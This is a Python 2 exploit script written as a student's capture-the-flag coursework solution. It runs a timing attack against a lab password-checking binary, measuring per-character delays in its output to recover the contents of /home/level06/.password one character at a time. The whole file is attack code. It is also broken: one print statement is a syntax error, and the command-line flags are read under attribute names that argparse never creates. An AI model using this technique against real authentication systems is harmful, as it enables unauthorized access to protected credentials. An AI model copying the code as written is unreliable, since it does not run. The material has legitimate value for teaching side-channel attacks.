#!/usr/bin/env python

# Sean Lowe
# Spring 2019 Cybersecurity
# Tinycore CTF Level06 exploit
# Timing attack against char-by-char comparison and fork()
# Mar 14 2019

import argparse
import subprocess
import sys
import time
from operator import itemgetter

def _write(string):
	# used for writing the correct guess to the screen to
	# to build a full password by the end of the program
	sys.stdout.write(string)
	sys.stdout.flush()

def is_correct(password):
	# check if a password is correct by opening a pipe to both stdout and stderr
	# .'s get printed to stderr, the "you're wrong" gets printed to stdout
	# checking both at the same time will tell us if a certain character is correct
	op = subprocess.Popen([EXEC, PASSWORD_FILE, password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stdout, stderr = op.communicate()
	if (stdout != 'Ha ha, your password is incorrect!\n'):
		# if stdout didn't print the error message, the password we just guessed is correct
		return True
	return False

def l_max(data): 
	# finding first local max of times for different characters
	index = 1
	prev_delta = 0
	for i in range(1, len(data) - 1):
		curr_delta = data[i] - data[i-1]
		if curr_delta >= prev_delta:
			index += 1
			prev_delta = curr_delta
		else:
			break
	return index

def trial(guesses):
	# build a dictionary of characters paired with how long it takes for the system to say it's wrong
	# for each character in the string that got passed in as 'guesses'
	g_time = dict((character, 0.0) for character in guesses)
	for character in guesses:
		# run as many times as was passed on the command line or the default 10
		for trial in range(TRIALS):
			# set how long each character runs for in the check
			g_time[character] += char_t(character)
	# sort items based on how long they took
	g_time = sorted(g_time.items(), key=itemgetter(1))
	part = l_max([g_time[i][1] for i in range(0, len(g_time) -1)])
	return [g_time[i][0] for i in range(part)]

def char_t(character):
	# make sure we don't start with a length of 0
	check = len(password)+1
	test = subprocess.Popen([EXEC, PASSWORD_FILE, password+character+'&'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	test.stderr.read(33) # remove the welcome line

	# set times to 0 to make sure we get a good reading
	s_time = 0.0
	e_time = 0.0
	while test.stderr.read(1) != '':
		if check == 1:
			# make sure it's one character we're testing
			s_time = time.time()
		elif check == 0:
			# we just tested the one character, exit the loop
			e_time = time.time()
			break
		check -= 1
	# return the difference between end and start time
	return e_time-s_time

if __name__ == '__main__':
	# give a bit of command line access to the program (more useful for running defaults than cli arguments)
	parser = argparse.ArgumentParser(description="timing attack for level06", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('exec', default="/levels/level06/level06", nargs='?')
	parser.add_argument('password_file', default="/home/level06/.password", nargs='?')
	parser.add_argument('-c', help="string of possible chars", default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	parser.add_argument('-t', help="# of trials", default=10, type=int)

	# run the arguments
	arguments = parser.parse_args()

	# create some useful variables based on arguments
	CHARACTERS, PASSWORD_FILE, EXEC, TRIALS = arguments.characters, arguments.password_file, arguments.exec, arguments.trials

	try:
		open(EXEC) # run the level06 password checker 
		exec = subprocess.Popen([EXEC, PASSWORD_FILE, ''], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		assert exec.stderr.read(32) == "Welcome to the password checker!"
	except IOError:
		print "Can't access %s, check path", % EXEC
	except AssertionError:
		print "%s isn't level06, check path" % EXEC
		sys.exit(1)
	
	# start with an empty string, call is_correct, then start running
	# trials on the characters passed in (or the default)
	password = ""
	while not is_correct(password):
		# start a guess with all the characters provided
		guesses = trial(CHARACTERS)
		while len(guesses) > 1:
			# create a list of averaged sets of times for letters
			guesses = list( set( trial(guesses) ) & set( trial(guesses) ) )
		
		if len(guesses) == 1:
			# add the next correct letter to our "password"
			password += guesses[0]
			_write(guesses[0]) # write that letter to the screen
		else:
			# remove the last entry in our guess
			password = password[0:-1]
			_write('\b \b') # backspace over the last printed character (our last guess)
	_write('\n')